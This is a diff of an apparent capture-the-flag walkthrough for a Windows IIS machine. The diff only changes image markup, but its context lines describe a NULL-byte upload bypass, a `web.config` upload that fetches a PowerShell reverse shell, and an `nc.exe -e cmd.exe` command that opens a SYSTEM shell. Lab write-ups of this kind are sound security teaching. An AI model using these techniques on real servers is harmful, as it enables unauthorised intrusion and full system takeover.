@@ -20,11 +20,11 @@ This is a pretty old machine AND its running Windows, so there's probably some k
 
 The web application just shows an image of a wizard:
 
-<figure><img src="../../../.gitbook/assets/image (1573).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(1573).png>)
 
 A quick check on the requests reveals this is running Microsoft-IIS/7.5.
 
-<figure><img src="../../../.gitbook/assets/image (1054).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(1054).png>)
 
 We can run a quick `gobuster` scan with `aspx,html,txt` extensions, and find a few files.
 
@@ -51,19 +51,19 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
 
 The ASPX page was a simple file upload.
 
-<figure><img src="../../../.gitbook/assets/image (1326).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(1326).png>)
 
 I tried to upload an ASPX reverse shell, but it gives me an Invalid File error.
 
-<figure><img src="../../../.gitbook/assets/image (2833).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(2833).png>)
 
 This can be bypassed via NULL byte by appending `%00.jpg` to the end of the filename in Burp.
 
-<figure><img src="../../../.gitbook/assets/image (3532).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(3532).png>)
 
 However, when trying to view the file at `/UploadedFiles/rev.aspx`, it returns an error instead of a shell.
 
-<figure><img src="../../../.gitbook/assets/image (228).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(228).png>)
 
 So uploading ASPX files doesn't work. But how about `web.config` files? It is possible to upload one that has VBScript embedded within it to execute commands. This is because we can potentially overwrite the existing `web.config` file and replace it with ours that executes commands.
 
@@ -96,7 +96,7 @@ Here's the file I used:
 
 This would download a simple Powershell reverse shell from our device. We can directly upload the `web.config` file without bypassing any file extension checks. Afterwards, visiting the `/UploadedFiles/web.config` directory would make the machine download and run the script, giving us a reverse shell.
 
-<figure><img src="../../../.gitbook/assets/image (1758).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(1758).png>)
 
 We can grab the user flag.
 
@@ -166,6 +166,6 @@ C:\users\merlin\desktop\exploit.exe "C:\users\merlin\desktop\nc.exe -e cmd.exe 1
 
 This would give us a reverse shell as SYSTEM.
 
-<figure><img src="../../../.gitbook/assets/image (1212).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(1212).png>)
 
 Rooted!
